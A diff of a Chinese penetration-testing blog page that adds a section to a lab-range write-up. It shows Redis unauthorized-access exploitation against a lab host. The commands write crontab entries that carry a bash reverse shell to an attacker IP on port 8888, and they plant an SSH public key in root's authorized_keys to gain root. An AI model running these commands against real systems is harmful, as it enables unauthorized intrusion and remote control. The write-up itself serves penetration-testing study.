@@ -370,16 +370,16 @@
                                 <span class="chip bg-color">内网攻防</span>
                             </a>
                         
+                            <a href="/tags/%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/">
+                                <span class="chip bg-color">隧道搭建</span>
+                            </a>
+                        
                             <a href="/tags/%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/">
                                 <span class="chip bg-color">综合渗透</span>
                             </a>
                         
                             <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/">
                                 <span class="chip bg-color">域渗透</span>
-                            </a>
-                        
-                            <a href="/tags/%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/">
-                                <span class="chip bg-color">隧道搭建</span>
                             </a>
                         
                             <a href="/tags/WHOAMI%E9%9D%B6%E5%9C%BA/">
@@ -418,21 +418,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2025-01-08
+                    2025-01-15
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    3.4k
+                    6.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    14 分
+                    25 分
                 </div>
                 
 
@@ -731,8 +731,251 @@ exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
 
 
 
+<h1 id="五、redis未授权访问getshell"><a href="#五、redis未授权访问getshell" class="headerlink" title="五、redis未授权访问getshell"></a>五、redis未授权访问getshell</h1><p>在最开始的信息收集中，能够看到192.168.43.253这台机子开启了redis 6379端口，且版本为2.8.17。从基本的信息看是极有可能存在redis未授权访问漏洞的。</p>
+<p>关于redis未授权访问漏洞的复现和利用方法，详见本站《redis未授权访问漏洞》一文：<a href="https://sxksec.cn/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/">https://sxksec.cn/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/</a></p>
+<h2 id="5-1-服务版本信息探测"><a href="#5-1-服务版本信息探测" class="headerlink" title="5.1 服务版本信息探测"></a>5.1 服务版本信息探测</h2><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2009.24.33.png" style="zoom:40%;">
+
+<h2 id="5-2-漏洞探测"><a href="#5-2-漏洞探测" class="headerlink" title="5.2 漏洞探测"></a>5.2 漏洞探测</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">redis-cli <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.43.253
+<span class="token operator">&gt;</span>info<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2009.26.23.png" style="zoom:50%;">
+
+<p>可以看到kali未经授权就可以连接到远端靶机的redis服务。</p>
+<h2 id="5-3-漏洞利用"><a href="#5-3-漏洞利用" class="headerlink" title="5.3 漏洞利用"></a>5.3 漏洞利用</h2><h3 id="5-3-1-写入计划任务"><a href="#5-3-1-写入计划任务" class="headerlink" title="5.3.1 写入计划任务"></a>5.3.1 写入计划任务</h3><h4 id="1）如果redis服务的用户权限较低"><a href="#1）如果redis服务的用户权限较低" class="headerlink" title="1）如果redis服务的用户权限较低"></a>1）如果redis服务的用户权限较低</h4><blockquote>
+<h4 id="ubuntu计划任务目录："><a href="#ubuntu计划任务目录：" class="headerlink" title="ubuntu计划任务目录："></a>ubuntu计划任务目录：</h4><p>在 Ubuntu 系统中，不存在 <code>/var/spool/cron/root</code> 这个目录。</p>
+<ul>
+<li><strong>关于 cron 任务存储位置</strong>：Ubuntu 系统中，用户的 cron 任务通常存储在 <code>/var/spool/cron/crontabs</code> 目录下。每个用户的 cron 任务文件以用户名命名，例如 root 用户的 cron 任务文件就是 <code>/var/spool/cron/crontabs/root</code>。这个文件包含了 root 用户设置的定时任务，如定时备份数据、定时清理日志等操作。</li>
+<li><strong>权限和安全性</strong>：<code>/var/spool/cron/crontabs</code> 目录的权限设置比较严格，只有特定的用户和组（通常是 crontab 组）才有权限访问和修改其中的文件，这样可以防止未授权的用户修改 cron 任务，从而保证系统的安全性和稳定性。</li>
+</ul>
+</blockquote>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2009.31.23.png" style="zoom:40%;">
+
+<p>无法设置为这个目录。权限不够。</p>
+<p>尝试使用/etc/crontab文件。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">set</span> hahaha <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>* * * * * root /bin/bash -i &gt;&amp; /dev/tcp/192.168.43.26/8888 0&gt;&amp;1 <span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2009.38.57.png" style="zoom:50%;">
+
+<p>save的时候报错。利用失败。可能是因为权限问题。</p>
+<p>为了实验顺利进行，web1这台靶机的redis服务应该以root权限启动：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> redis-server /etc/redis.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="2）在-var-spool-cron-crontabs-root写入计划任务（失败）"><a href="#2）在-var-spool-cron-crontabs-root写入计划任务（失败）" class="headerlink" title="2）在/var/spool/cron/crontabs/root写入计划任务（失败）"></a>2）在/var/spool/cron/crontabs/root写入计划任务（失败）</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/spool/cron/crontabs
+config <span class="token builtin class-name">set</span> dbfilename root
+<span class="token builtin class-name">set</span> xxxxx <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.43.26/8888 0&gt;&amp;1 <span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span>
+save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2010.06.13.png" style="zoom:40%;">
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2010.09.36.png" style="zoom:50%;">
+
+<p>攻击端并没有接收到shell。</p>
+<h4 id="3）在-etc-crontab写入计划任务"><a href="#3）在-etc-crontab写入计划任务" class="headerlink" title="3）在/etc/crontab写入计划任务"></a>3）在/etc/crontab写入计划任务</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /etc
+config <span class="token builtin class-name">set</span> dbfilename <span class="token function">crontab</span>
+<span class="token builtin class-name">set</span> xxxxx <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>* * * * * root /bin/bash -i &gt;&amp; /dev/tcp/192.168.43.26/8888 0&gt;&amp;1 <span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span>
+save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2010.11.24.png" style="zoom:40%;">
+
+<p>攻击端没有接收到回连的shell。</p>
+<h3 id="5-3-2-上传ssh公钥"><a href="#5-3-2-上传ssh公钥" class="headerlink" title="5.3.2 上传ssh公钥"></a>5.3.2 上传ssh公钥</h3><p>将公钥写入key.txt文件</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /root/.ssh
+<span class="token punctuation">(</span>echo <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">;</span><span class="token function">cat</span> id_rsa.pub<span class="token punctuation">;</span><span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> /root/key.txt
+<span class="token function">cat</span> /root/key.txt <span class="token operator">|</span>./redis-cli <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.43.253 <span class="token parameter variable">-x</span> <span class="token builtin class-name">set</span> pub
+redis-cli <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.52.4
+config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /root/.ssh
+config <span class="token builtin class-name">set</span> dbfilename authorized_keys
+save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2010.23.29.png" style="zoom:50%;">
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2010.29.32.png" style="zoom:40%;">
+
+<p>bingo！成功获取到web1靶机的root权限。</p>
+<h2 id="5-4-信息收集"><a href="#5-4-信息收集" class="headerlink" title="5.4 信息收集"></a>5.4 信息收集</h2><p>拿下的这台192.168.43.253的服务器，还有另外一个ip 192.168.52.10。</p>
+<p>之前通过Laravel RCE+容器逃逸拿下的那台机子是ubuntu14.04的系统，两块网卡的ip分别是192.168.52.20和192.168.93.10。但我们之前访问Laravel web服务的时候，ip是192.168.43.253，分析43.253这台机器是一个反向代理服务器。</p>
+<blockquote>
+<h4 id="Nginx-的-conf-d-目录用途及与-nginx-conf-的关系："><a href="#Nginx-的-conf-d-目录用途及与-nginx-conf-的关系：" class="headerlink" title="Nginx 的 conf.d 目录用途及与 nginx.conf 的关系："></a>Nginx 的 <code>conf.d</code> 目录用途及与 <code>nginx.conf</code> 的关系：</h4><p><code>/etc/nginx/conf.d</code> 目录用于存储额外的配置文件，这些配置文件通常包含针对特定站点或服务的配置，使得 Nginx 的主配置文件更加简洁和模块化。具体用途如下：</p>
+<ul>
+<li><p><strong>模块化配置</strong>：<code>/etc/nginx/conf.d</code> 目录用于存储额外的配置文件，每个文件通常以 <code>.conf</code> 结尾，例如 <code>default.conf</code>。这种模块化配置方式使得每个配置文件可以独立配置特定的站点或服务，从而让主配置文件更加简洁和易于管理。</p>
+</li>
+<li><p><strong>包含机制</strong>：Nginx 的主配置文件 <code>/etc/nginx/nginx.conf</code> 通常会包含 <code>/etc/nginx/conf.d</code> 目录下的所有配置文件，使用 <code>include</code> 指令。例如：</p>
+<p>nginx复制</p>
+<pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token directive"><span class="token keyword">http</span></span> <span class="token punctuation">{</span>
+    <span class="token directive"><span class="token keyword">include</span> /etc/nginx/conf.d/*.conf</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>这样，Nginx 在启动时会按照文件名的字母顺序加载 <code>/etc/nginx/conf.d</code> 目录下的所有配置文件，并将它们合并成一个完整的配置。</p>
+</li>
+</ul>
+</blockquote>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /etc/nginx/nginx.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2010.40.26.png" style="zoom:50%;">
+
+<p>主配置文件还包含了conf.d下的子配置文件。</p>
